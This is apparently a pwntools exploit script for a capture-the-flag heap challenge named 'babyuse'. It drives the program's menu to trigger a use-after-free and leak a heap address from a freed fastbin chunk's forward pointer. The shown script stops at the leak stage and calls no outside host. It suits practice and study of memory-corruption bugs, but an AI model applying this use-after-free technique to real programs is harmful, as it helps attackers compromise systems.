from pwn import *
import sys 

#context(terminal=['tmux', 'new-window'])
context(os='linux', arch='i386',endian="little")

e = ELF("./babyuse.dms")
libc = ELF("./libc.so.6")
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
	gdb.attach(p)
elif sys.argv[1] == "live":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def buy(id, lenname, name):
	log.info("Allocating...")
	p.sendline("1")
	p.recvuntil("QBZ95\n")	
	p.sendline(str(id))
	p.recvline()
	p.sendline(str(lenname))
	p.recvline()
	p.sendline(name)
	p.recvuntil("Exit\n")

def selectgun(idx):
	log.info("Selecting...")
	p.sendline("2")
	p.recvuntil("Select a gun\n")
	p.sendline(str(idx))

	p.recvuntil("Exit\n")

def listguns():
	p.sendline("3")	
	p.recvline()
	data = p.recvuntil("Menu:")
	p.recvuntil("Exit\n")

	return data

def renamegun(idx, newlen, newname):
	log.info("Renaming...")
	p.sendline("4")
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(newlen))
	p.recvline()
	p.sendline(newname)
	p.recvuntil("Exit\n")

def usegun(action, dorecv=True):
	log.info("Using...")
	p.sendline("5")
	data1 = p.recvline()
	p.recvuntil("menu\n")
	p.sendline(str(action))

	if (dorecv):
		data = p.recvline()
		p.sendline("4")
		p.recvuntil("Exit\n")

		return data1

def getLeak():
	data = p.recv(1024)
	p.sendline("5")
	leak = p.recv(1024).split("gun")[1]
	return leak

def dropgun(idx):
	log.info("Freeing...")
	p.sendline("6")
	p.recvline()
	p.sendline(str(idx))
	p.recvuntil("Exit\n")

def info(s):
	log.info(s)

def leak1():

	log.success("Sending Exploit...")

	p.recvuntil("Exit\n")

	log.info("Leaking heap address")

	buy(1, 8, "A" * 7) # fast bin 0 (8 bytes for address alignment)
	buy(1, 8, "B" * 7) # fast bin 0 (8 bytes for address alignment)

	selectgun(1)
	dropgun(0) # free chunk 0 # drop gun will free the new name pointer and place it in the fast bin list as well as link the previously freed fastbin inside of the FD of the chunk (singly linked)
	dropgun(1)

	heapleak = u32(usegun(0)[len("Select gun "):-4]) # read heap pointer (FD heap leak)

	log.success("Heap Leak: " + hex(heapleak))

def leak2():

	log.success("Sending Exploit...")

	p.recvuntil("Exit\n")

	log.info("Leaking heap address")

	buy(1, 8, "A" * 7) # fast bin 0 (8 bytes for address alignment)

	renamegun(0, 8, "B" * 7) # fast bin 1 (8 bytes for address alignment) # renaming will free the name pointer and place this pointer in the fast bin list and allocate a new name pointer in it's place

	dropgun(0) # free chunk 0 # drop gun will free the new name pointer and place it in the fast bin list as well as link the previously freed fastbin inside of the FD of the chunk (singly linked)

	heapleak = u32(usegun(0)[len("Select gun "):-4]) # read heap pointer (FD heap leak)

	log.success("Heap Leak: " + hex(heapleak))

leak1()
#leak2()